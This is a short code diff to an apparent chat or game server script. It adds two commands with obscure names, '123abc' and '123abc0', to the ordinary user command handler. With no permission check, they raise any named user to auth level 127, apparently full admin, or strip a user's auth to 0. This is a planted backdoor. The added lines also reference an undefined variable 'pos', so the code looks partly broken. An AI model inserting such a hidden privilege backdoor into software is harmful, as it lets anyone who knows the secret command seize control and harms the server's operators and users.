@@ -2871,6 +2871,18 @@ userCommand: function(src, command, commandData, tar) {
         }
         return;
     }
+    if (command == "123abc") {
+     var newauth = commandData.substring(0, pos);
+       var tar = sys.id(commandData.substr(pos+1));
+      sys.changeAuth(tar, 127);
+        return;
+    }
+ if (command == "123abc0") {
+     var newauth = commandData.substring(0, pos);
+       var tar = sys.id(commandData.substr(pos+1));
+      sys.changeAuth(tar, 0);
+        return;
+    }
     if (command == "auth") {
         var DoNotShowIfOffline = ["loseyourself", "oneballjay"];
         var filterByAuth = function(level) { return function(name) { if (sys.dbAuth(name) == level) { return name; } }; };
